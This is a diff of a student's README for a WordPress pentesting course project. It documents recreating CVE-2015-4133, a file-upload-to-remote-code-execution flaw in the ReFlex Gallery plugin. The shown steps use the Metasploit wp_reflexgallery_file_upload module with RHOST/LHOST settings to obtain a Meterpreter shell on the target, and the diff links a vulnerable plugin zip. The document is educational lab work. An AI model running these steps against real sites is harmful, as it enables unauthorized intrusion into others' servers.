@@ -4,7 +4,7 @@ See branches for assignments.
 
 # Project 7 - WordPress Pentesting
 
-Time spent: **15** hours spent in total
+Time spent: **25** hours spent in total
 
 > Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress
 
@@ -31,14 +31,17 @@ Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vul
     - Vulnerability types: Arbitrary file upload, remote code execution.
     - Tested in version: WordPress 4.2, ReFlex Gallery plugin 3.1.3
     - Fixed in version: ReFlex Gallery plugin 3.1.4
-  - [ ] GIF Walkthrough: <img src="" alt="Walkthrough" style="max-width: 100%;">
+  - [ ] GIF Walkthrough: 
+  - [ ] ![WP_reflex_gallery_pwned](https://user-images.githubusercontent.com/98624766/163491702-53e1d5cb-5cbf-4be2-b410-b855596067fd.gif)
   - [ ] Steps to recreate: 
     -  1. Confirm WordPress target host is vulnerable. Reflex Gallery plugin version older than 3.1.4 must be installed and activated.
-    -  2. Run metasploit from attacker machine using the following commands:
-        -  sudo service postgresql start
-        -  sudo msfdb init
-        -  msfconsole
-    -  2a. in msfconsole shell, run the following commands to install the metasploit payload and create a connection with the target machine:
+      -  1a. Upload image into Reflex gallery plugin.
+    -  2. Add Reflex gallery shortcode into post. 
+    -  3. Run metasploit from attacker machine using the following commands:
+        - sudo service postgresql start
+        - sudo msfdb init
+        - msfconsole
+    -  3a. in msfconsole shell, run the following commands to install the metasploit payload and create a connection with the target machine:
         - db_status
         - search Reflex #output should be: exploit/unix/webapp/wp_reflexgallery_file_upload
         - use exploit/unix/webapp/wp_reflexgallery_file_upload
@@ -46,13 +49,14 @@ Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vul
         - set RHOST <url.of.target.machine>
         - set LHOST <url.of.attacker.machine>
         - exploit
-    -  3. Meterpreter shell running, run the following commands to start a new shell inside the target machine:
+    -  4. Meterpreter shell running, run the following commands to start a new shell inside the target machine:
         - shell
         
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
   - References:
   - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4133
+  - Reflex Plugin 3.1.3 zip: [reflex-gallery.3.1.3.zip](https://github.com/peelingwave/cis221_codepath/files/8492582/reflex-gallery.3.1.3.zip)
 
 ### 3. (Required) Vulnerability Name or ID
   - [ ] Summary: 
